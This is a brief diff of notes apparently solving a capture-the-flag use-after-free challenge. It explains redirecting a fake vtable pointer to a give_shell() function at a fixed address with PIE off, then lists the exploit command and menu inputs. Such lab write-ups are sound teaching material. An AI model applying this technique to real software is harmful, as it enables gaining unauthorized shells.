@@ -1,0 +1,8 @@
+###Use after Free
+###Try to let function fake virtual ptr point to give_shell()
+###pie is off, so we can easily find give_shell() at 0x401568
+###Man object size = 24
+./uaf 24 /tmp/fake
+> 3
+> 2
+> 1
